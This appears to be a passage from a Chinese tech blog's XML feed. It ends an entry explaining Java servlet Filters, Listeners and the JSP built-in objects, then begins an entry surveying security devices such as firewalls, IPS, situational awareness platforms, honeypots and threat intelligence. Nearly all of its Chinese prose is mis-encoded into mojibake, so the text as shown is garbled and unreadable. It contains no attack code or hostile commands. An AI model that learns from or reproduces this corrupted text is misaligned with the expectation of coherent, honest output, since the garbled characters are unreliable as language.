å†™äº†ä¸ªè®ºå›ç½‘ç«™ï¼Œç”¨è¿‡æ»¤å™¨å¯ä»¥ï¼š</p><ol><li>è‡ªåŠ¨æŠŠç”¨æˆ·å‘çš„è„è¯æ›¿æ¢æˆ***</li><li>æ£€æŸ¥ç”¨æˆ·æ˜¯å¦ç™»å½•æ‰èƒ½å‘å¸–</li><li>è®°å½•æ¯ä¸ªè®¿é—®çš„IPåœ°å€</li><li>ç»™ç½‘é¡µå†…å®¹è‡ªåŠ¨åŠ ä¸Šé˜²æ‹·è´æ°´å°</li></ol><p>ä»£ç ç¤ºä¾‹ç†è§£ï¼š<br>å°±åƒä½ é›‡äº†ä¸ªä¿å®‰ï¼ˆFilterï¼‰ï¼Œæ¯ä¸ªè®¿å®¢ï¼ˆè¯·æ±‚ï¼‰è¿›å…¬å¸ï¼ˆæœåŠ¡å™¨ï¼‰ä¹‹å‰ï¼Œä¿å®‰ä¼šæ£€æŸ¥å·¥ç‰Œï¼ˆç™»å½•çŠ¶æ€ï¼‰ã€‚å¦‚æœæ£€æŸ¥é€šè¿‡ï¼Œå°±æ”¾è¡Œï¼ˆchain.doFilterï¼‰ï¼›å¦‚æœæ²¡å·¥ç‰Œï¼Œå°±æ‹¦åœ¨é—¨å¤–ï¼ˆè·³è½¬åˆ°ç™»å½•é¡µï¼‰ã€‚</p><p>æ•´ä¸ªè¿‡ç¨‹å°±åƒæµæ°´çº¿åŠ å·¥ï¼š<br>æµè§ˆå™¨ â†’ è¿‡æ»¤å™¨1ï¼ˆæ¯”å¦‚æ£€æŸ¥ç™»å½•ï¼‰â†’ è¿‡æ»¤å™¨2ï¼ˆæ¯”å¦‚è®°å½•æ—¥å¿—ï¼‰â†’ æœåŠ¡å™¨å¤„ç† â†’ è¿‡æ»¤å™¨3ï¼ˆæ¯”å¦‚å‹ç¼©æ•°æ®ï¼‰â†’ è¿”å›ç»™æµè§ˆå™¨</p><p>æœ€å¤§çš„å¥½å¤„æ˜¯ï¼šä¸ç”¨æ”¹ç½‘ç«™åŸæœ‰ä»£ç ï¼Œå°±èƒ½æ‰¹é‡å¢åŠ å„ç§å®‰å…¨æ£€æŸ¥å’Œé™„åŠ åŠŸèƒ½ï¼Œå°±åƒç»™æ‰‹æœºè£…å„ç§æ»¤é•œAPPä¸€æ ·æ–¹ä¾¿ã€‚</p><h1 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h1><hr><h3 id="Listener-å¤§ç™½è¯è§£é‡Š"><a href="#Listener-å¤§ç™½è¯è§£é‡Š" class="headerlink" title="Listener å¤§ç™½è¯è§£é‡Š"></a><strong>Listener å¤§ç™½è¯è§£é‡Š</strong></h3><p><strong>Listener å°±åƒå¿«é€’ç«™çš„ã€Œè‡ªåŠ¨ç›‘æ§ç³»ç»Ÿã€</strong>ï¼Œå®ƒä¸ç›´æ¥å¤„ç†å¿«é€’ï¼ˆè¯·æ±‚&#x2F;å“åº”ï¼‰ï¼Œä½†èƒ½è‡ªåŠ¨æ„ŸçŸ¥å¿«é€’ç«™é‡Œå‘ç”Ÿçš„å„ç§äº‹ä»¶ï¼Œæ¯”å¦‚ï¼š</p><ul><li>ğŸ“¦ <strong>æœ‰äººæ¥å–ä»¶</strong>ï¼ˆç”¨æˆ·åˆ›å»ºäº†ä¼šè¯ï¼‰</li><li>ğŸ“¦ <strong>å¿«é€’è¢«é€€å›</strong>ï¼ˆç”¨æˆ·å…³é—­äº†æµè§ˆå™¨ï¼‰</li><li>ğŸ“¦ <strong>å¿«é€’ç«™å¼€é—¨&#x2F;å…³é—¨</strong>ï¼ˆæœåŠ¡å™¨å¯åŠ¨&#x2F;å…³é—­ï¼‰</li><li>ğŸ“¦ <strong>è´§æ¶ä¸Šçš„åŒ…è£¹è¢«ç§»åŠ¨</strong>ï¼ˆæ•°æ®è¢«ä¿®æ”¹ï¼‰</li></ul><p><strong>åªè¦è¿™äº›äº‹ä»¶å‘ç”Ÿï¼Œç›‘å¬å™¨å°±ä¼šè‡ªåŠ¨è§¦å‘å¯¹åº”çš„æ“ä½œ</strong>ï¼Œæ¯”å¦‚å‘çŸ­ä¿¡é€šçŸ¥ä½ ã€æ›´æ–°åº“å­˜ã€è®°å½•æ—¥å¿—ç­‰ç­‰ã€‚</p><hr><h3 id="ä¸¾ä¸ªå®é™…ä¾‹å­"><a href="#ä¸¾ä¸ªå®é™…ä¾‹å­" class="headerlink" title="ä¸¾ä¸ªå®é™…ä¾‹å­"></a><strong>ä¸¾ä¸ªå®é™…ä¾‹å­</strong></h3><p><strong>åœºæ™¯</strong>ï¼šä½ æƒ³ç»Ÿè®¡ç½‘ç«™çš„åœ¨çº¿äººæ•°<br><strong>ç”¨ Listener æ€ä¹ˆåš</strong>ï¼š</p><ol><li><strong>å½“ç”¨æˆ·ç™»å½•æ—¶</strong>ï¼ˆåˆ›å»ºäº†ä¸€ä¸ª Sessionï¼‰ï¼Œè‡ªåŠ¨ç»™åœ¨çº¿äººæ•° +1</li><li><strong>å½“ç”¨æˆ·é€€å‡ºæˆ– Session è¿‡æœŸæ—¶</strong>ï¼Œè‡ªåŠ¨ç»™åœ¨çº¿äººæ•° -1</li><li><strong>å½“æœåŠ¡å™¨é‡å¯æ—¶</strong>ï¼Œè‡ªåŠ¨æ¸…é›¶åœ¨çº¿äººæ•°</li></ol><p><strong>å…¨ç¨‹ä¸éœ€è¦ä½ æ‰‹åŠ¨å†™ä»£ç å»ç»Ÿè®¡</strong>ï¼Œç›‘å¬å™¨åƒä¸ªå°é›·è¾¾ä¸€æ ·è‡ªåŠ¨å¸®ä½ ç›¯ç€è¿™äº›äº‹ä»¶ï¼</p><hr><h3 id="Listener-èƒ½ç›‘å¬å“ªäº›äº‹ï¼Ÿ"><a href="#Listener-èƒ½ç›‘å¬å“ªäº›äº‹ï¼Ÿ" class="headerlink" title="Listener èƒ½ç›‘å¬å“ªäº›äº‹ï¼Ÿ"></a><strong>Listener èƒ½ç›‘å¬å“ªäº›äº‹ï¼Ÿ</strong></h3><p>1. </p><p>   æœåŠ¡å™¨çº§åˆ«</p><p>   ï¼š</p><ul><li>æœåŠ¡å™¨å¯åŠ¨ï¼ˆæ¯”å¦‚åŠ è½½æ•°æ®åº“é…ç½®ï¼‰</li><li>æœåŠ¡å™¨å…³é—­ï¼ˆæ¯”å¦‚ä¿å­˜æœªå¤„ç†å®Œçš„æ•°æ®ï¼‰</li></ul><p>2. </p><p>   ç”¨æˆ·ä¼šè¯ï¼ˆSessionï¼‰çº§åˆ«</p><p>   ï¼š</p><ul><li>ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ï¼ˆåˆ›å»º Sessionï¼‰</li><li>ç”¨æˆ·å…³é—­æµè§ˆå™¨ï¼ˆé”€æ¯ Sessionï¼‰</li></ul><p>3. </p><p>   æ•°æ®å˜åŒ–</p><p>   ï¼š</p><ul><li>æŸä¸ªæ•°æ®è¢«æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤ï¼ˆæ¯”å¦‚è´­ç‰©è½¦å•†å“å˜åŒ–ï¼‰</li></ul><hr><h3 id="Listener-vs-Filter-åŒºåˆ«"><a href="#Listener-vs-Filter-åŒºåˆ«" class="headerlink" title="Listener vs Filter åŒºåˆ«"></a><strong>Listener vs Filter åŒºåˆ«</strong></h3><ul><li>ğŸ”§ <strong>Filterï¼ˆè¿‡æ»¤å™¨ï¼‰</strong>ï¼šåƒä¿å®‰ï¼Œ<strong>ä¸»åŠ¨æ£€æŸ¥</strong>æ¯ä¸ªè¿›å‡ºçš„äººï¼ˆè¯·æ±‚&#x2F;å“åº”ï¼‰ï¼Œä¸é€šè¿‡å°±æ‹¦ä¸‹ã€‚</li><li>ğŸ“¡ <strong>Listenerï¼ˆç›‘å¬å™¨ï¼‰</strong>ï¼šåƒç›‘æ§æ‘„åƒå¤´ï¼Œ<strong>è¢«åŠ¨æ„ŸçŸ¥</strong>äº‹ä»¶å‘ç”Ÿï¼Œé»˜é»˜æ‰§è¡Œåå°ä»»åŠ¡ã€‚</li></ul><hr><h3 id="ä¸€å¥è¯æ€»ç»“-1"><a href="#ä¸€å¥è¯æ€»ç»“-1" class="headerlink" title="ä¸€å¥è¯æ€»ç»“"></a><strong>ä¸€å¥è¯æ€»ç»“</strong></h3><p><strong>Listener å°±æ˜¯ç»™æœåŠ¡å™¨è£…äº†ä¸ªã€Œæ™ºèƒ½æ„Ÿåº”å™¨ã€</strong>ï¼Œå®ƒèƒ½è‡ªåŠ¨æ„ŸçŸ¥å„ç§äº‹ä»¶ï¼Œå¹¶åœ¨èƒŒåå¸®ä½ å¹²æ´»ï¼Œå°±åƒä½ å®¶çš„æ™ºèƒ½å®¶å±…è‡ªåŠ¨å¼€ç¯å…³ç¯ä¸€æ ·çœå¿ƒï¼</p><h1 id="JSP-åŸºç¡€"><a href="#JSP-åŸºç¡€" class="headerlink" title="JSP åŸºç¡€"></a>JSP åŸºç¡€</h1><p>JSPï¼ˆJava Server Pagesï¼‰ï¼Œæ˜¯Javaçš„ä¸€ç§åŠ¨æ€ç½‘é¡µæŠ€æœ¯ã€‚åœ¨æ—©æœŸJavaçš„å¼€å‘æŠ€æœ¯ä¸­ï¼ŒJavaç¨‹åºå‘˜å¦‚æœæƒ³è¦å‘æµè§ˆå™¨è¾“å‡ºä¸€äº›æ•°æ®ï¼Œå°±å¿…é¡»å¾—æ‰‹åŠ¨<code>println</code>ä¸€è¡Œè¡Œçš„HTMLä»£ç ã€‚ä¸ºäº†è§£å†³è¿™ä¸€ç¹ççš„é—®é¢˜ï¼ŒJavaå¼€å‘äº†JSPæŠ€æœ¯ã€‚</p><p>JSPå¯ä»¥çœ‹ä½œä¸€ä¸ªJava Servletï¼Œä¸»è¦ç”¨äºå®ç°Java webåº”ç”¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢éƒ¨åˆ†ã€‚ç½‘é¡µå¼€å‘è€…ä»¬é€šè¿‡ç»“åˆHTMLä»£ç ã€XHTMLä»£ç ã€XMLå…ƒç´ ä»¥åŠåµŒå…¥JSPæ“ä½œå’Œå‘½ä»¤æ¥ç¼–å†™JSPã€‚</p><p>å½“ç¬¬ä¸€æ¬¡è®¿é—®JSPé¡µé¢æ—¶ï¼ŒTomcatæœåŠ¡å™¨ä¼šå°†JSPé¡µé¢ç¿»è¯‘æˆä¸€ä¸ªjavaæ–‡ä»¶ï¼Œå¹¶å°†å…¶ç¼–è¯‘ä¸º.classæ–‡ä»¶ã€‚JSPé€šè¿‡ç½‘é¡µè¡¨å•è·å–ç”¨æˆ·è¾“å…¥æ•°æ®ã€è®¿é—®æ•°æ®åº“åŠå…¶ä»–æ•°æ®æºï¼Œç„¶ååŠ¨æ€åœ°åˆ›å»ºç½‘é¡µã€‚</p><h3 id="JSPå†…ç½®å¯¹è±¡"><a href="#JSPå†…ç½®å¯¹è±¡" class="headerlink" title="JSPå†…ç½®å¯¹è±¡"></a>JSPå†…ç½®å¯¹è±¡</h3><p>JSPæœ‰ä¹å¤§å†…ç½®å¯¹è±¡ï¼Œä»–ä»¬èƒ½å¤Ÿåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯äº¤äº’çš„è¿‡ç¨‹ä¸­åˆ†åˆ«å®Œæˆä¸åŒçš„åŠŸèƒ½ã€‚å…¶ç‰¹ç‚¹å¦‚ä¸‹</p><ul><li><p>ç”± JSP è§„èŒƒæä¾›ï¼Œä¸ç”¨ç¼–å†™è€…å®ä¾‹åŒ–</p></li><li><p>é€šè¿‡ Web å®¹å™¨å®ç°å’Œç®¡ç†</p></li><li><p>æ‰€æœ‰ JSP é¡µé¢å‡å¯ä½¿ç”¨</p></li><li><p>åªæœ‰åœ¨è„šæœ¬å…ƒç´ çš„è¡¨è¾¾å¼æˆ–ä»£ç æ®µä¸­æ‰èƒ½ä½¿ç”¨</p></li><li></li><li><table><thead><tr><th>å¯¹ è±¡</th><th>ç±»å‹</th><th>è¯´ æ˜</th></tr></thead><tbody><tr><td><a href="https://drun1baby.top/jsp2/request.html">request</a></td><td>javax.servlet.http.HttpServletRequest</td><td>è·å–ç”¨æˆ·è¯·æ±‚ä¿¡æ¯</td></tr><tr><td><a href="https://drun1baby.top/jsp2/response.html">response</a></td><td>javax.servlet.http.HttpServletResponse</td><td>å“åº”å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¹¶å°†å¤„ç†ä¿¡æ¯è¿”å›åˆ°å®¢æˆ·ç«¯</td></tr><tr><td><a href="https://drun1baby.top/jsp2/out.html">out</a></td><td>javax.servlet.jsp.JspWriter</td><td>è¾“å‡ºå†…å®¹åˆ° HTML ä¸­</td></tr><tr><td><a href="https://drun1baby.top/jsp2/session.html">session</a></td><td>javax.servlet.http.HttpSession</td><td>ç”¨æ¥ä¿å­˜ç”¨æˆ·ä¿¡æ¯</td></tr><tr><td><a href="https://drun1baby.top/jsp2/application.html">application</a></td><td>javax.servlet.ServletContext</td><td>æ‰€æœ‰ç”¨æˆ·å…±äº«ä¿¡æ¯</td></tr><tr><td><a href="https://drun1baby.top/jsp2/config.html">config</a></td><td>javax.servlet.ServletConfig</td><td>è¿™æ˜¯ä¸€ä¸ª Servlet é…ç½®å¯¹è±¡ï¼Œç”¨äº Servlet å’Œé¡µé¢çš„åˆå§‹åŒ–å‚æ•°</td></tr><tr><td><a href="https://drun1baby.top/jsp2/pagecontext.html">pageContext</a></td><td>javax.servlet.jsp.PageContext</td><td>JSP çš„é¡µé¢å®¹å™¨ï¼Œç”¨äºè®¿é—® pageã€requestã€application å’Œ session çš„å±æ€§</td></tr><tr><td><a href="https://drun1baby.top/jsp2/page_object.html">page</a></td><td>javax.servlet.jsp.HttpJspPage</td><td>ç±»ä¼¼äº Java ç±»çš„ this å…³é”®å­—ï¼Œè¡¨ç¤ºå½“å‰ JSP é¡µé¢</td></tr><tr><td><a href="https://drun1baby.top/jsp2/page.html">exception</a></td><td>java.lang.Throwable</td><td>è¯¥å¯¹è±¡ç”¨äºå¤„ç† JSP æ–‡ä»¶æ‰§è¡Œæ—¶å‘ç”Ÿçš„é”™è¯¯å’Œå¼‚å¸¸ï¼›åªæœ‰åœ¨ JSP é¡µé¢çš„ page æŒ‡ä»¤ä¸­æŒ‡å®š isErrorPage çš„å–å€¼ true æ—¶ï¼Œæ‰å¯ä»¥åœ¨æœ¬é¡µé¢ä½¿ç”¨ exception å¯¹è±¡ã€‚</td></tr></tbody></table></li></ul><p>from:<a href="https://drun1baby.top/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸è§å®‰å…¨è®¾å¤‡æ€»ç»“</title>
      <link href="/2025/03/27/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%80%BB%E7%BB%93%E2%80%9C/"/>
      <url>/2025/03/27/%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E6%80%BB%E7%BB%93%E2%80%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡"><a href="#ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡" class="headerlink" title="ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡"></a>ä¸€ã€ç½‘ç»œå®‰å…¨è®¾å¤‡</h2><p>ç½‘ç»œå®‰å…¨è®¾å¤‡æ˜¯ä¸€ä¸ªæœ‰è½¯ä»¶å’Œç¡¬ä»¶è®¾å¤‡ç»„åˆè€Œæˆã€åœ¨å†…éƒ¨ç½‘å’Œå¤–éƒ¨ç½‘ä¹‹é—´ã€ä¸“ç”¨ç½‘ä¸å…¬å…±ç½‘ ä¹‹é—´çš„ç•Œé¢ä¸Šæ„é€ çš„ä¿æŠ¤å±éšœï¼Œé’ˆå¯¹ä¸åŒçš„åº”ç”¨åœºæ™¯æœ‰ä¸åŒçš„ä½œç”¨ï¼Œå¸¸è§çš„å®‰å…¨è®¾å¤‡æœ‰é˜²ç«å¢™ï¼Œæ€åŠ¿æ„ŸçŸ¥ï¼ŒIDSï¼ŒIPSï¼Œå…¨æµé‡åˆ†æï¼Œæ¼æ´æ‰«æï¼Œèœœç½ ï¼Œå®‰å…¨é‚®ä»¶ï¼ŒEDRç­‰ç­‰ã€‚</p><h2 id="ç½‘ç»œç»“æ„"><a href="#ç½‘ç»œç»“æ„" class="headerlink" title="ç½‘ç»œç»“æ„"></a>ç½‘ç»œç»“æ„</h2><p>é¦–å…ˆï¼Œç»˜åˆ¶äº†æœ€ç®€æ˜“ä¸‰å±‚<a href="https://so.csdn.net/so/search?q=%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84&spm=1001.2101.3001.7020">ç½‘ç»œæ‹“æ‰‘ç»“æ„</a>(å«å†…å¤–ç½‘)ã€‚ç°æ— ä»»ä½•å®‰å…¨è®¾å¤‡ï¼Œä»‹ç»æ¯ä¸€ç±»è®¾å¤‡ï¼Œå¸¸ç”¨åŠŸèƒ½ã€<strong>éƒ¨ç½²æ–¹å¼</strong>ï¼ŒåŒæ—¶ç»˜å…¥ç°æœ‰æ‹“æ‰‘ä¸­ï¼Œå±•ç¤ºç§äº§å“åœ¨ç½‘ç»œä¸­æœ€å¸¸è§„ä½ç½®ã€‚</p><p><strong>éƒ¨ç½²æ–¹å¼å°¤å…¶é‡è¦ï¼Œé€šå¸¸éœ€å¯¹ç½‘ç»œè¿›è¡Œæ§åˆ¶è®¾å¤‡ä¸²è¡Œã€å®¡è®¡ç±»è®¾å¤‡æ—æŒ‚ï¼Œä¸²è¡Œæ—¶è®¾å¤‡æ•…éšœå¯èƒ½äº§ç”Ÿç½‘ç»œæ•…éšœï¼›è€Œæ—æŒ‚è®¾å¤‡åªå½±å“è‡ªèº«åŠŸèƒ½</strong></p><p><a href="https://blog.csdn.net/weixin_46444606/article/details/114528599">https://blog.csdn.net/weixin_46444606/article/details/114528599</a></p><h2 id="1-é˜²ç«å¢™"><a href="#1-é˜²ç«å¢™" class="headerlink" title="1.é˜²ç«å¢™"></a>1.é˜²ç«å¢™</h2><p>ä¸²è¡Œè®¾å¤‡<br>ç½‘ç»œè¾¹ç•Œé—´çš„éš”ç¦»å’Œå¯¹ç½‘ç»œä¸­æ•°æ®äº¤äº’çš„æ§åˆ¶ã€‚åœ¨å…¸å‹çš„ç½‘ç»œç¯å¢ƒä¸­çš„ä¸»è¦ä½œç”¨æ˜¯é˜²èŒƒå¤–éƒ¨ç½‘ç»œï¼ˆå¦‚internetï¼‰å¯¹å†…éƒ¨ç½‘ç»œï¼ˆå¦‚å†…éƒ¨åŠå…¬å±€åŸŸç½‘ï¼‰çš„éæ³•è®¿é—®è¡Œä¸ºå’Œæ¶æ„æ”»å‡»è¡Œä¸ºç­‰å®‰å…¨å¨èƒï¼Œé˜²ç«å¢™æœ€åŸºç¡€çš„åŠŸèƒ½æ˜¯ç­–ç•¥æ§åˆ¶æµå…¥æµå‡ºIPåŠç«¯å£ã€natã€ç«¯å£æ˜ å°„ã€‚é˜²ç«å¢™å®šä¹‰ä¹Ÿè¾ƒä¸ºæ¨¡ç³Šï¼Œå¤šå¸¦æœ‰é›†æˆåŠŸèƒ½ï¼Œç›®å‰ï¼Œä¸–é¢ä¸Šè´­ä¹°çš„é˜²ç«å¢™å¤§å¤šä¹Ÿå¸¦æœ‰IPSåŠŸèƒ½æˆ–æœåŠ¡ï¼ˆå…¼é¡¾åŠŸèƒ½ï¼‰<br>é˜²ç«å¢™çš„â€œä¸²è¡Œè®¾å¤‡â€ç‰¹æ€§è®©å®ƒæˆä¸ºç½‘ç»œè¾¹ç•Œçš„<strong>å”¯ä¸€å…³å¡</strong>ï¼Œé€šè¿‡ç­–ç•¥ã€NATã€ç«¯å£æ˜ å°„ä¸‰å¤§åŸºç¡€åŠŸèƒ½ï¼ŒåŠ ä¸Šç°ä»£é›†æˆçš„IPSç­‰é«˜çº§èƒ½åŠ›ï¼Œå®ç°äº†â€œå¤–é˜²å…¥ä¾µã€å†…æ§é£é™©â€çš„æ•ˆæœã€‚ä¸è¿‡ï¼Œå®ƒä¹Ÿä¸æ˜¯ä¸‡èƒ½çš„â€”â€”å°±åƒé—¨å«å¯èƒ½æ¼æ‰ä¼ªè£…æˆå¿«é€’çš„é»‘å®¢ï¼Œé˜²ç«å¢™ä¹Ÿéœ€è¦é…åˆå…¶ä»–è®¾å¤‡ï¼ˆå¦‚IDSã€æ—¥å¿—å®¡è®¡ï¼‰æ‰èƒ½æ›´å®‰å…¨</p><h2 id="2-IPSï¼ˆå…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰"><a href="#2-IPSï¼ˆå…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰" class="headerlink" title="2.IPSï¼ˆå…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰"></a>2.IPSï¼ˆå…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰</h2><p><strong>ä¸²è¡Œè®¾å¤‡</strong><br>é˜²å¾¡ç½‘ç»œä¸­çš„æ”»å‡»å’Œå…¥ä¾µç­‰è¡Œä¸ºçš„ç½‘å…³å‹å®‰å…¨è®¾å¤‡ï¼Œ<strong>åœ¨å®‰å…¨åŠŸèƒ½ä¸Šæ˜¯å¯¹é˜²ç«å¢™çš„ä¸€ä¸ªè¡¥å……ï¼Œ</strong> å®ƒèƒ½å¤Ÿæ¯”é˜²ç«å¢™æ›´æ·±å…¥çš„å¯¹æ•°æ®è¿›è¡Œæ£€æµ‹å’Œæ§åˆ¶ï¼Œè¿›è€Œæå‡ç½‘ç»œå¯¹äºå…¥ä¾µæ”»å‡»ç­‰å¨èƒçš„é˜²èŒƒæ°´å¹³ã€‚<strong>æœ¬è´¨æ˜¯å¢å¼ºå…¥ä¾µè¡Œä¸ºåº“ï¼Œæ£€æµ‹å‡ºåè‡ªåŠ¨è¿›è¡Œé˜²å¾¡</strong></p><p><strong>å¦‚ä½•è¡¥å……é˜²ç«å¢™</strong></p><p>é˜²ç«å¢™åƒå°åŒºçš„é—¨å«ï¼Œåªæ£€æŸ¥â€œå¿«é€’å•â€ï¼ˆIP åœ°å€ã€ç«¯å£å·ï¼‰ï¼Œæ¯”å¦‚ï¼š</p><p><strong>é—¨å«çš„å±€é™</strong>ï¼šèƒ½æ‹¦ä½æ²¡å·¥ç‰Œçš„å¤–äººï¼Œä½†å¦‚æœåäººä¼ªé€ äº†å·¥ç‰Œï¼ˆæ¯”å¦‚é€šè¿‡åˆæ³•ç«¯å£å‘é€æ”»å‡»æ•°æ®ï¼‰ï¼Œé—¨å«å°±æ”¾è¡Œäº†</p><p><strong>IPS çš„å‡çº§</strong>ï¼šIPS ä¼šæ‹†å¼€å¿«é€’åŒ…è£¹æ£€æŸ¥å†…å®¹ï¼Œæ¯”å¦‚</p><p>å‘ç°åŒ…è£¹é‡Œè—äº†åˆ€ç‰‡ï¼ˆSQL æ³¨å…¥ä»£ç ï¼‰æˆ–ç‚¸å¼¹ï¼ˆç—…æ¯’æ–‡ä»¶ï¼‰ï¼Œç›´æ¥æ‹¦æˆª</p><p>ç”šè‡³èƒ½è¯†åˆ«æ–°å‹æ”»å‡»æ‰‹æ®µï¼Œæ¯”å¦‚ä¼ªè£…æˆæ­£å¸¸æ–‡ä»¶çš„å‹’ç´¢è½¯ä»¶</p><h2 id="æ€åŠ¿æ„ŸçŸ¥"><a href="#æ€åŠ¿æ„ŸçŸ¥" class="headerlink" title="æ€åŠ¿æ„ŸçŸ¥"></a>æ€åŠ¿æ„ŸçŸ¥</h2><p>æ€åŠ¿æ„ŸçŸ¥æ˜¯ä¸€ç§åŸºäºç¯å¢ƒçš„ã€åŠ¨æ€ã€æ•´ä½“åœ°æ´æ‚‰å®‰å…¨é£é™©çš„èƒ½åŠ›ï¼Œæ˜¯ä»¥å®‰å…¨å¤§æ•°æ®ä¸ºåŸºç¡€ï¼Œä»å…¨å±€è§†è§’æå‡å¯¹å®‰å…¨å¨èƒçš„å‘ç°è¯†åˆ«ã€ç†è§£åˆ†æã€å“åº”å¤„ç½®èƒ½åŠ›çš„ä¸€ç§æ–¹å¼ï¼Œæœ€ç»ˆæ˜¯ä¸ºäº†å†³ç­–ä¸è¡ŒåŠ¨ï¼Œ æ˜¯å®‰å…¨èƒ½åŠ›çš„è½åœ°</p><p><strong>æ€åŠ¿æ„ŸçŸ¥</strong>å°±åƒç»™ç½‘ç»œè£…äº†ä¸€ä¸ªâ€œæ™ºèƒ½é›·è¾¾+é¢„è¨€å®¶â€çš„ç»„åˆï¼Œå®ƒèƒ½ <strong>å®æ—¶ç›‘æ§æ•´ä¸ªç½‘ç»œç¯å¢ƒ</strong>ï¼ŒæŠŠå„ç§é›¶æ•£çš„ä¿¡æ¯æ‹¼æˆä¸€å¼ â€œå®‰å…¨åœ°å›¾â€ï¼Œç„¶åå‘Šè¯‰ä½ ï¼šâ€œç°åœ¨å“ªå„¿æœ‰é—®é¢˜ï¼Ÿæ¥ä¸‹æ¥å¯èƒ½è¦å‡ºä»€ä¹ˆäº‹ï¼Ÿå’±ä»¬è¯¥æ€ä¹ˆé˜²ï¼Ÿâ€<br>ç®€å•è¯´å°±æ˜¯ï¼š<strong>çœ‹æ¸…ç°çŠ¶ã€é¢„æµ‹é£é™©ã€æå‰åŠ¨æ‰‹</strong>ï¼Œè®©ç½‘ç»œä»â€œè¢«åŠ¨æŒ¨æ‰“â€å˜æˆâ€œä¸»åŠ¨é˜²</p><p><strong>æ€åŠ¿æ„ŸçŸ¥ &#x3D; å®æ—¶ç›‘æ§ + æ™ºèƒ½åˆ†æ + é£é™©é¢„è¨€</strong>ã€‚å®ƒè®©ç½‘ç»œå®‰å…¨ä»â€œå¤´ç—›åŒ»å¤´â€å˜æˆâ€œæ²»æœªç—…â€ï¼Œæ ¸å¿ƒå°±ä¸€å¥è¯ï¼š<strong>â€œåˆ«ç­‰é»‘å®¢åŠ¨æ‰‹ï¼Œå’±å…ˆå µæ­»ä»–çš„è·¯ï¼</strong></p><h2 id="èœœç½"><a href="#èœœç½" class="headerlink" title="èœœç½"></a>èœœç½</h2><p>èœœç½è¿™ä¸ªè¯ï¼Œæœ€æ—©æ˜¯è¢«çŒäººä½¿ç”¨çš„ï¼Œå¯¹ï¼Œå°±æ˜¯è¿›å±±æ‰“çŒçš„äººã€‚çŒäººæŠŠç½å­è£…ä¸Š èœ‚èœœï¼Œç„¶åæ”¾ä¸ªé™·é˜±ï¼Œä¸“é—¨ç”¨æ¥æ•æ‰å–œæ¬¢ç”œé£Ÿçš„ç†Šã€‚åæ¥åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸé‡Œï¼Œ äººä»¬å°±æŠŠæ¬ºéª—æ”»å‡»è€…çš„è¯±é¥µç§°ä¸ºâ€œèœœç½â€</p><p><strong>èœœç½</strong>å°±åƒç½‘ç»œä¸–ç•Œé‡Œçš„ <strong>â€œé’“é±¼é™·é˜±â€</strong>ï¼Œä¸“é—¨ç”¨æ¥å¿½æ‚ é»‘å®¢ã€‚å®ƒçš„æ ¸å¿ƒé€»è¾‘å°±æ˜¯ï¼š<strong>å‡è£…è‡ªå·±æ˜¯ä¸ªâ€œè½¯æŸ¿å­â€ï¼Œå¸å¼•åäººè¿‡æ¥æï¼Œç„¶åå·å·è®°ä¸‹ä»–ä»¬çš„ä½œæ¡ˆæ‰‹æ³•</strong>ã€‚<br>è¯´ç™½äº†ï¼Œèœœç½å°±æ˜¯ä¸€ä¸ª <strong>â€œå‡ç›®æ ‡â€</strong>ï¼Œæ•…æ„éœ²å‡ºç ´ç»½è®©é»‘å®¢æ”»å‡»ï¼Œå®é™…ç›®çš„æ˜¯ä¸ºäº†æ‘¸æ¸…å¯¹æ–¹çš„è·¯æ•°ï¼Œä¿æŠ¤çœŸæ­£çš„ç³»ç»Ÿã€‚</p><h2 id="å¨èƒæƒ…æŠ¥"><a href="#å¨èƒæƒ…æŠ¥" class="headerlink" title="å¨èƒæƒ…æŠ¥"></a>å¨èƒæƒ…æŠ¥</h2><p>å¨èƒæƒ…æŠ¥æ˜¯æŒ‡åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­ï¼Œé€šè¿‡å¯¹æ¶æ„æ´»åŠ¨è¿›è¡Œæ”¶é›†ã€åˆ†æå’Œå¤„ç†ï¼Œå½¢æˆæœ‰å…³ç½‘ç»œå¨èƒçš„æƒ…æŠ¥ä¿¡æ¯ï¼Œä»¥ä¾¿åŠæ—¶é‡‡å–æªæ–½ä¿éšœç½‘ç»œå®‰å…¨ã€‚å¨èƒæƒ…æŠ¥ä¸»è¦åŒ…æ‹¬æ¶æ„è½¯ä»¶ã€ç½‘ç»œæ”»å‡»ã€ç½‘ç»œçŠ¯ç½ªç­‰æ–¹é¢çš„æƒ…æŠ¥ä¿¡æ¯ã€‚</p><p> 